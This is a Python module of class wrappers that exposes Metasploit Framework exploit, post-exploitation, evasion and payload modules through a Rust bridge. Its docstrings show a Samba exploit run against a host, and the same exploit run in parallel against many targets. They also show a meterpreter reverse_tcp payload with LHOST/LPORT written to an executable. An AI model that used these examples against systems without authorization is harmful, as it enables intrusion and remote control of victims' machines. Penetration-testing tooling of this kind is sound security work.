"""Type-specific module classes for Metasploit Framework.

This module provides a class hierarchy that exposes only the appropriate API
for each of the 7 MSF module types:

- BaseModule: Shared metadata and options (all types inherit from this)
- AuxiliaryModule: Scanners, fuzzers, servers (run(), actions())
- EncoderModule: Payload encoding/obfuscation (encode())
- EvasionModule: AV/EDR bypass (run(), targets)
- ExploitModule: Vulnerability exploitation (exploit(), check(), targets)
- NopModule: NOP sled generation (generate_sled())
- PayloadModule: Shellcode generation (generate(), to_handler())
- PostModule: Post-exploitation, requires session (run(session))

Example:
    from msf import init_msf, create_module

    init_msf("/path/to/metasploit-framework")

    # Factory returns appropriate type
    exploit = create_module("exploit/linux/samba/is_known_pipename")
    assert isinstance(exploit, ExploitModule)
    assert exploit.module_type == "exploit"

    # Type-specific API
    exploit.options.RHOSTS = "192.168.1.100"
    print(exploit.compatible_payloads())  # Only on ExploitModule
    session = exploit.exploit("cmd/unix/interact")
"""

from __future__ import annotations

import asyncio
import time
from typing import Any, List, Optional, Set, TYPE_CHECKING

from .options import ModuleOptions

if TYPE_CHECKING:
    from .session import Session


# =============================================================================
# BaseModule - Shared functionality for all module types
# =============================================================================


class BaseModule:
    """
    Base class for all MSF module types.

    Provides shared functionality: metadata properties, options access,
    and validation. Type-specific subclasses add their own methods.

    This class should not be instantiated directly - use create_module()
    which returns the appropriate subclass.
    """

    def __init__(self, rust_module):
        """Initialize with the Rust Module wrapper.

        Args:
            rust_module: The Rust Module instance from pyo3 bridge
        """
        self._rust = rust_module
        self._options: Optional[ModuleOptions] = None

    # === Module Type ===

    @property
    def module_type(self) -> str:
        """Module type (auxiliary, encoder, evasion, exploit, nop, payload, post)."""
        return self._rust.module_type()

    # === Options (attribute-style access) ===

    @property
    def options(self) -> ModuleOptions:
        """Access module options with attribute-style syntax.

        Example:
            module.options.RHOSTS = "192.168.1.100"
            module.options.RPORT = 445
        """
        if self._options is None:
            self._options = ModuleOptions(self._rust)
        return self._options

    # === Metadata Properties ===

    @property
    def fullname(self) -> str:
        """Full module path (e.g., 'exploit/linux/samba/is_known_pipename')."""
        return self._rust.fullname()

    @property
    def description(self) -> str:
        """Module description text."""
        return self._rust.description()

    @property
    def author(self) -> List[str]:
        """List of module authors."""
        return self._rust.author()

    @property
    def references(self) -> List[str]:
        """Security references (CVEs, URLs, etc.)."""
        return self._rust.references()

    @property
    def platform(self) -> List[str]:
        """Target platforms (e.g., ['linux', 'unix'])."""
        return self._rust.platform()

    @property
    def arch(self) -> List[str]:
        """Target architectures (e.g., ['x86', 'x64'])."""
        return self._rust.arch()

    @property
    def rank(self) -> str:
        """Module reliability rank (excellent, great, good, normal, average, low, manual)."""
        return self._rust.rank()

    @property
    def license(self) -> str:
        """Module license."""
        return self._rust.license()

    @property
    def disclosure_date(self) -> Optional[str]:
        """Vulnerability disclosure date."""
        return self._rust.disclosure_date()

    @property
    def privileged(self) -> bool:
        """Whether module requires privileged access."""
        return self._rust.privileged()

    # === Validation ===

    def validate(self) -> bool:
        """Validate all options are correctly configured."""
        return self._rust.validate()

    # === Backward Compatibility ===

    def set_option(self, key: str, value: Any) -> None:
        """Set option value (prefer module.options.KEY = value)."""
        self._rust._set_option(key, str(value))

    def __repr__(self) -> str:
        return f"<{self.__class__.__name__}: {self.fullname}>"


# =============================================================================
# ExploitModule - Vulnerability exploitation
# =============================================================================


class ExploitModule(BaseModule):
    """
    Exploit module for vulnerability exploitation.

    Provides methods for running exploits, checking vulnerability status,
    and listing compatible payloads.

    Example:
        exploit = create_module("exploit/linux/samba/is_known_pipename")
        exploit.options.RHOSTS = "192.168.1.100"

        # Check if vulnerable
        if exploit.has_check():
            print(exploit.check())

        # Run exploit
        session = exploit.exploit("cmd/unix/interact")
        if session:
            print(session.run_cmd("whoami"))
    """

    @property
    def targets(self) -> List[str]:
        """Available exploit targets."""
        return self._rust.targets()

    def compatible_payloads(self) -> List[str]:
        """Get list of compatible payload names."""
        return self._rust.compatible_payloads()

    def has_check(self) -> bool:
        """Check if module supports vulnerability checking."""
        return self._rust.has_check()

    def check(self) -> str:
        """Run vulnerability check against target."""
        return self._rust.check()

    def exploit(self, payload: str, timeout: int = 60) -> Optional["Session"]:
        """
        Run exploit and wait for session.

        Args:
            payload: Payload name (e.g., "cmd/unix/interact")
            timeout: Seconds to wait for session (default: 60)

        Returns:
            Session object if successful, None otherwise

        Example:
            session = module.exploit("cmd/unix/interact")
            if session:
                print(session.run_cmd("whoami"))
        """
        from .session import Session

        rust_session = self._rust.exploit_expect_session(payload, timeout)
        if rust_session is not None:
            return Session(rust_session)
        return None

    async def exploit_async(self, payload: str, timeout: int = 60) -> Optional["Session"]:
        """
        Run exploit asynchronously with parallel execution support.

        This method launches the exploit as a background job and polls for
        a session while releasing the Ruby GVL, enabling true parallel
        exploitation of multiple targets.

        Args:
            payload: Payload name (e.g., "cmd/unix/interact")
            timeout: Seconds to wait for session (default: 60)

        Returns:
            Session object if successful, None otherwise

        Example:
            # Single async exploit
            session = await module.exploit_async("cmd/unix/interact")

            # Parallel exploitation of multiple targets
            async def exploit_targets(targets):
                tasks = []
                for target in targets:
                    module = create_module("exploit/linux/samba/is_known_pipename")
                    module.options.RHOSTS = target
                    tasks.append(module.exploit_async("cmd/unix/interact"))
                return await asyncio.gather(*tasks)
        """
        from . import sleep_releasing_gvl, list_sessions, get_session

        # Launch exploit as background job (creates Ruby thread)
        self._rust.exploit_job(payload)

        # Track sessions that existed before our exploit
        seen_sessions: Set[int] = set(list_sessions())
        start_time = time.time()

        # Poll for new sessions, releasing GVL between checks
        while time.time() - start_time < timeout:
            # Release GVL so Ruby background threads can execute
            sleep_releasing_gvl(100)  # 100ms with GVL released

            # Check for new sessions
            current_sessions = set(list_sessions())
            new_sessions = current_sessions - seen_sessions

            if new_sessions:
                session_id = next(iter(new_sessions))
                rust_session = get_session(session_id)
                if rust_session:
                    return rust_session
                seen_sessions = current_sessions

            await asyncio.sleep(0)

        return None

    def exploit_job(self, payload: str) -> Optional[str]:
        """
        Run exploit as background job (non-blocking).

        Args:
            payload: Payload name (e.g., "cmd/unix/interact")

        Returns:
            Job ID (as string) if job was started, None if it completed immediately
        """
        return self._rust.exploit_job(payload)


# =============================================================================
# AuxiliaryModule - Scanners, fuzzers, servers
# =============================================================================


class AuxiliaryModule(BaseModule):
    """
    Auxiliary module for scanning, fuzzing, and server operations.

    Auxiliary modules don't exploit vulnerabilities directly - they perform
    supporting tasks like port scanning, service enumeration, or running
    fake servers.

    Example:
        scanner = create_module("auxiliary/scanner/portscan/tcp")
        scanner.options.RHOSTS = "192.168.1.0/24"
        scanner.options.PORTS = "22,80,443"

        # Check available actions
        print(scanner.actions())
        print(scanner.default_action())

        # Run the scanner
        scanner.run()
    """

    def actions(self) -> List[str]:
        """Get available actions for this module."""
        return self._rust.actions()

    def default_action(self) -> Optional[str]:
        """Get default action name."""
        return self._rust.default_action()

    @property
    def action(self) -> Optional[str]:
        """Get current action."""
        return self._rust.action()

    @action.setter
    def action(self, value: str) -> None:
        """Set current action."""
        self._rust._set_option("ACTION", value)

    def run(self) -> bool:
        """Run the auxiliary module.

        Returns:
            True if successful, False otherwise
        """
        return self._rust.run()


# =============================================================================
# PostModule - Post-exploitation (requires session)
# =============================================================================


class PostModule(BaseModule):
    """
    Post-exploitation module that operates on an existing session.

    Post modules require an active session to run. They perform tasks like
    gathering credentials, escalating privileges, or pivoting.

    Example:
        # First get a session from an exploit
        exploit = create_module("exploit/linux/samba/is_known_pipename")
        session = exploit.exploit("cmd/unix/interact")

        # Then run post module with the session
        post = create_module("post/multi/gather/env")
        post.run(session)  # Session is REQUIRED
    """

    def actions(self) -> List[str]:
        """Get available actions for this module."""
        return self._rust.actions()

    def default_action(self) -> Optional[str]:
        """Get default action name."""
        return self._rust.default_action()

    @property
    def action(self) -> Optional[str]:
        """Get current action."""
        return self._rust.action()

    @action.setter
    def action(self, value: str) -> None:
        """Set current action."""
        self._rust._set_option("ACTION", value)

    def run(self, session: "Session") -> bool:
        """Run the post module on a session.

        Args:
            session: An active Session object (required)

        Returns:
            True if successful, False otherwise

        Raises:
            TypeError: If session is None or not provided
            ValueError: If session is not alive

        Example:
            post = create_module("post/multi/gather/env")
            post.run(session)
        """
        if session is None:
            raise TypeError("PostModule.run() requires a session argument")
        if not session.alive:
            raise ValueError("Session is not alive")

        # Set SESSION option internally
        self._rust._set_option("SESSION", str(session.sid))
        return self._rust.run()


# =============================================================================
# EvasionModule - AV/EDR bypass
# =============================================================================


class EvasionModule(BaseModule):
    """
    Evasion module for bypassing AV/EDR detection.

    Evasion modules generate payloads designed to evade security software.

    Example:
        evasion = create_module("evasion/windows/applocker_evasion_msbuild")
        evasion.options.LHOST = "192.168.1.100"
        evasion.run()
    """

    @property
    def targets(self) -> List[str]:
        """Available targets."""
        return self._rust.targets()

    def compatible_payloads(self) -> List[str]:
        """Get list of compatible payload names (if supported)."""
        return self._rust.compatible_payloads()

    def run(self) -> bool:
        """Run the evasion module.

        Returns:
            True if successful, False otherwise
        """
        return self._rust.run()


# =============================================================================
# PayloadModule - Shellcode generation
# =============================================================================


class PayloadModule(BaseModule):
    """
    Payload module for generating shellcode.

    Similar to msfvenom, payload modules generate executable payloads
    that can be used standalone or with exploits.

    Example:
        # Generate payload bytes (like msfvenom)
        payload = create_module("payload/windows/x64/meterpreter/reverse_tcp")
        payload.options.LHOST = "192.168.1.100"
        payload.options.LPORT = 4444

        # Generate raw shellcode
        shellcode = payload.generate(format="raw")

        # Or generate executable
        exe_bytes = payload.generate(format="exe")
        with open("payload.exe", "wb") as f:
            f.write(exe_bytes)

        # Optionally start handler to receive callbacks
        handler_job = payload.to_handler()
    """

    def generate(self, format: str = "raw") -> bytes:
        """Generate payload bytes.

        Args:
            format: Output format (raw, exe, elf, dll, etc.)

        Returns:
            Generated payload as bytes

        Note:
            This is a placeholder - full implementation requires
            Rust bridge support for payload generation.
        """
        # TODO: Implement when Rust bridge adds generate() support
        raise NotImplementedError(
            "PayloadModule.generate() requires Rust bridge implementation. "
            "For now, use msfvenom or the Ruby API directly."
        )

    def to_handler(self) -> Optional[str]:
        """Start a handler for this payload.

        Creates an exploit/multi/handler configured for this payload
        and starts it as a background job.

        Returns:
            Job ID of the handler, or None if failed

        Note:
            This is a placeholder - full implementation requires
            Rust bridge support.
        """
        # TODO: Implement when Rust bridge adds to_handler() support
        raise NotImplementedError(
            "PayloadModule.to_handler() requires Rust bridge implementation."
        )


# =============================================================================
# EncoderModule - Payload encoding
# =============================================================================


class EncoderModule(BaseModule):
    """
    Encoder module for obfuscating payloads.

    Encoders transform payloads to evade signature-based detection
    and remove bad characters.

    Example:
        encoder = create_module("encoder/x86/shikata_ga_nai")
        encoded = encoder.encode(shellcode, badchars=b"\\x00\\x0a")
    """

    def encode(self, data: bytes, badchars: Optional[bytes] = None) -> bytes:
        """Encode payload data.

        Args:
            data: Raw payload bytes to encode
            badchars: Characters to avoid in output

        Returns:
            Encoded payload bytes

        Note:
            This is a placeholder - full implementation requires
            Rust bridge support.
        """
        # TODO: Implement when Rust bridge adds encode() support
        raise NotImplementedError(
            "EncoderModule.encode() requires Rust bridge implementation."
        )


# =============================================================================
# NopModule - NOP sled generation
# =============================================================================


class NopModule(BaseModule):
    """
    NOP module for generating NOP sleds.

    NOP sleds are sequences of no-operation instructions used in
    buffer overflow exploits to increase reliability.

    Example:
        nop = create_module("nop/x86/single_byte")
        sled = nop.generate_sled(100)
    """

    def generate_sled(
        self,
        length: int,
        badchars: Optional[bytes] = None,
        save_registers: Optional[List[str]] = None,
    ) -> bytes:
        """Generate a NOP sled.

        Args:
            length: Desired length of the sled in bytes
            badchars: Characters to avoid in output
            save_registers: Registers to preserve

        Returns:
            NOP sled as bytes

        Note:
            This is a placeholder - full implementation requires
            Rust bridge support.
        """
        # TODO: Implement when Rust bridge adds generate_sled() support
        raise NotImplementedError(
            "NopModule.generate_sled() requires Rust bridge implementation."
        )


